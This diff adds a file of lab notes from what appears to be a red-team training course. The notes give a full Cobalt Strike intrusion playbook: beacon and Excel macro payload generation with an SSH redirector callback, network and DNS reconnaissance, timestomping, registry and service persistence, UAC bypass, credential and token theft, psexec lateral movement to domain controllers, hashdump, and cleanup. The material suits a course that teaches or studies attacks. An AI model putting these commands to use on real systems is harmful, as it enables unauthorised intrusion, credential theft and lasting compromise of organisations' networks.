@@ -1,0 +1,191 @@
+Lab 1
+* Open Chrome – “https://172.30.100.<student#>:8006
+* Open Terminal (Team Server)
+o Retrieve “cobaltstrike-trial.tgz” from share if necessary
+o “cd” to the correct directory and run “tar –xvf cobaltstrike-trial.tgz” – Should be under root
+o “cd cobaltstrike”
+o “./teamserver” (To check syntax)
+o “./teamserver <redirectorIP> <createPassword>” You will use this password again
+o Do not close terminal
+* Open a second terminal (Cobalt Strike)
+o “./cobaltstrike”
+o Cobalt will open and fill out pop-up window – Enter password you just created
+o Hit “connect”
+* Create a listener
+o Listener name ex: “HTTPS_74.28.31.46”
+o Change dropdown to HTTPS
+o Port 443
+* Open a third terminal (SSH)
+o “ssh –R <redirectorIP>:443:127.0.0.1:443 root@<redirectorIP>
+o Use password found in “Lab Information” for Redirector
+o Optional – “netstat –pantu” – “State” should say “Established”
+* Open Firefox “https://74.28.31.46” - Blank page should appear
+* “View” – “Web Log” to confirm Firefox appeared
+* Go to “Attacks” – “Packages” – Choose “Windows Executable (S)” – “Generate”
+o Create folder titled “Payloads”
+o Within that folder create another folder with a detailed name such as “Windows32_74.28.31.46_HTTPS”
+o Save “beacon.exe” to Desktop
+* Go to your files and post the beacon you just created to the share
+* Go to Windows VM and open share
+o Double click beacon.exe – Drag file to Desktop to open if it doesn’t work
+* Go back to Kali VM and you should see the activity there
+
+
+Lab 3
+* Go to Kali terminal
+* “which dnsrecon” – Locates command
+* “cd /usr/bin”
+* “nmap –sT 172.16.20.0/24 –T4 --top-ports 1000 –oA scanof_172.16.20.0.0-24 –n”
+This is the target subnet
+* “dnsrecon –t rvl –n 172.16.20.10 --xml /root/Desktop/dnsreconoutput –r 172.16.20.0/24” 
+* This IP is the Domain Controller (172.16.20.10)
+
+
+Lab 4
+* Go to Cobalt Strike
+* Go to “Attack” – “Packages” – “MS Office Macro”
+o Select HTTPS – Click “Generate” – Click “Copy Macro”
+* Open Leafpad
+o Paste – Save to Desktop as “macro.txt”
+* Open share and copy over “macro.txt”
+* Go to Windows VM to check if the file is there
+o Open with WordPad
+o Copy all
+* Open Excel – View – Macros
+o Use “init” as the title
+o Click “Create” 
+o Remove what’s in the file then paste
+o Save to Desktop
+o Use the format Excel 97-2003 Workbook so the file won’t save as .xlsm
+o Open the Excel file you just created and click enable to test if it works
+o Check Kali VM to verify it worked
+* Inform instructors to get a macro
+* Cobalt Strike should show user popped up from enabling macro
+
+
+
+
+Lab 5
+* In Linux VM, go to your beacon and right click and select “Interact”
+* Within the beacon terminal:
+o “sleep 2”
+o “shell tasklist /v” to view domain and user
+o “shell net user Guy.Fleegman /domain” to run as Guy
+o “cd C:\users\guy.fleegman\appdata\local\temp”
+o “pwd” to view current directory
+o “shell systeminfo” - Next to “System Type” will show x64 or x32
+o “ls” to list files
+o “upload /root/Desktop/Payloads/Windows32_74.28.31.46_HTTP/wm.exe
+* This .exe payload should be a name that blends in with files in the current folder
+o “timestomp wm.exe wmsetup.log”
+o “ls” to double check file was added and time stamp was correctly changed
+o ‘shell REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “wm” /t REG_SZ /F /D “C:\users\guy.fleegman\AppData\Local\Temp\wm.exe’
+o “shell shutdown /r /t 0 /f”
+o New callback should appear
+
+
+Lab 7
+* Escalate privileges to SYSTEM
+* Find Guy Fleegman’s credentials
+o “cd C:\users\guy.fleegman\Desktop”
+o “ls”
+o “download pass.txt”
+o “View” – “Downloads”
+o Select download – Click “Sync Files” – Save file to Desktop
+* “cd C:\Users\Public”
+* “upload” – Select executable
+* “runas SPRINGFIELD\guy.fleegman.da <password> C:\Users\Public\wm.exe”	
+(Make sure to include the full path)
+* Interact with .da callback
+o “bypassuac”
+* Select listener then click “Choose”
+* “*” should pop up under callbacks
+
+
+Lab 8
+* Gaining Persistence
+* Ensure you’re in C:\Windows\System32
+* Under * callback create executable – This time output is “Windows Service EXE” – Choose name that blends in with the above folder
+* “upload” – Select services executable you just created
+* “timestomp services_pa.exe services.msc”
+* ‘shell sc create services_pa binPath= “C:\Windows\System32\services_pa.exe” DisplayName= “Services PA” start= auto’
+* ‘shell sc description services_pa “Description here”’
+* “shell sc start services_pa”
+* “shell shutdown /r /t 0 /f”
+* New SYSTEM* should pop up – Interact with it
+
+
+Lab 9 & 10
+* Under SYSTEM*
+* “make_token SPRINGFIELD\guy.fleegman.da <password>”
+* “shell tasklist /v /s \\172.16.20.10”
+* Create listener – SMB – port 8080
+* “psexec_psh 172.16.20.10 SMB”
+* “link” if didn’t connect on first try
+* Go to new DC callback – Interact
+o “hashdump”
+
+
+
+
+
+Lab 11
+* Interact with DC
+* “shell dsquery.exe * -filter “(objectclass=user)” –attr * -limit 2”
+* “shell dsquery.exe * -filter “(&(objectclass=computer)(operatingsystem=*windows 7*))” –attr name operatingSystem operatingSystemVersion description –limit 10”
+* Three workstations fit this criteria. Already have control over SPRWS-32.
+* Chose SPRWS-19
+* “shell nslookup <name>”
+* Compare IP address to off limits list. If not on there then proceed
+* “make_token SPRINGFIELD\guy.fleegman.da <password>” 
+- Because can’t run psexec from SYSTEM
+* Create SMB listener (use port 8080) or use the other listener you created
+* “psexec_psh 172.16.20.144” – Then it will ask to choose a listener
+* “rev2self” to return to SYSTEM
+* Open callback showing the new IP under “internal”
+* Gain persistence
+o Ensure you’re in C:\Windows\System32
+o “shell systeminfo” to see if x64 or x32
+o “upload” select services executable made earlier
+o “timestomp services_pa.exe services.msc”
+o ‘shell sc create services_pa binPath= “C:\Windows\System32\services_pa.exe” DisplayName= “Services PA” start= auto’
+o ‘shell sc description services_pa “Description here”’
+o “shell sc start services_pa”
+o “shell shutdown /r /t 0 /f”
+o New SYSTEM* should pop up – Interact with it
+
+
+
+
+
+
+
+
+Lab 12
+* Must run dsquery through DC
+* “shell dsquery.exe * -filter “(objectclass=trusteddomain)” –attr flatname trustdirection”
+* Under “ps” found “explorer.exe” with user “ERSHON\Administrator”
+* “steal_token 2972” – Use PID for explorer.exe
+*  “shell ipconfig /all”
+* “shell nslookup IP” on IP under “DNS Servers” command should tell you if that IP is a DC. DC usually end in .10
+* “psexec_psh 172.16.5.10” – Will ask to select SMB listener
+* “ERSHON-DC1” – Should show as a new callback
+
+
+Clean Up
+* Go to callback “ERSHON-DC1”
+o “ps” – The “PID” of the callback matches the “powershell.exe”
+o “exit” – Should lose link
+* Got to callback “SPR-DC1”
+o “exit”
+* Go to “SPRWS-19”
+o “ps” – Find upnpcont.exe and PID
+o “shell start C:\Windows\System32\upnpcont.exe”
+o “inject 1680 x86” – Will ask for HTTPS listener
+* A new callback should appear with this PID – Interact with it
+o “rm services_pa.exe” The file I made earlier
+* If used “psexec_psh” command - powershell should be running in processes
+* If used a service, check by using “shell sc qc services_pa”
+o To delete – “shell sc delete services_pa”
+* “shell taskkill /PID <PID#> /f” – This is the PID for rundll32 and this command kills the process
+* “exit
